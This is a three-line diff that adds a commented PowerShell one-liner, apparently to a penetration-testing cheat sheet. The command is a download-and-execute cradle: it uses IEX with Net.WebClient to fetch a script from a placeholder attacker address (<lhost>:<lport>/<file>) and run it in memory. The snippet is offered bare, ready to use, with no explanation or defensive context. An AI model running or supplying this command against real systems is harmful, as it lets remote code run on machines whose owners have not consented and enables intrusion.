@@ -1,0 +1,3 @@
+# download and execute string
+powershell "IEX(New-Object Net.WebClient).downloadString('http://<lhost>:<lport>/<file>')"
+
